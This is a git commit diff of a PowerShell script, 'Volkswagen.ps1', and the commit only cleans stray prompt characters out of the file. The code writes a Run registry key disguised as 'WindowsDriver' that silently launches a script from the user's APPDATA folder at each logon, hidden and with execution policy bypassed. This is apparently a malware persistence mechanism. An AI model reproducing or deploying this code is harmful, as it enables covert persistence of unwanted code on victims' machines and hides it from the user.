b57f0fa92c55762eb1b952ce79ff9d4491b5eb39
JiriWeiss <75065909+JiriWeiss@users.noreply.github.com>
2025-05-23 07:45:36 +0200

    Update Volkswagen.ps1

--- Volkswagen.ps1
+++ Volkswagen.ps1
@@ -1,15 +1,15 @@
 $scriptPath = "$env:APPDATA\SchedTas.ps1"
->> $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
->> $regName = "WindowsDriver"
->>
->> try {
->>     Set-ItemProperty -Path $regPath -Name $regName -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
->>     $check = Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue
->>     if ($check.$regName) {
->>         Write-Host "[+] Skript přidán do HKCU\Run."
->>     } else {
->>         Write-Host "[-] Nepodařilo se ověřit zápis do registru."
->>     }
->> } catch {
->>     Write-Host "[-] Chyba při zápisu do registru: $_"
->> }
+$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$regName = "WindowsDriver"
+
+try {
+    Set-ItemProperty -Path $regPath -Name $regName -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
+    $check = Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue
+    if ($check.$regName) {
+        Write-Host "[+] Skript přidán do HKCU\Run."
+    } else {
+        Write-Host "[-] Nepodařilo se ověřit zápis do registru."
+    }
+} catch {
+    Write-Host "[-] Chyba při zápisu do registru: $_"
+}
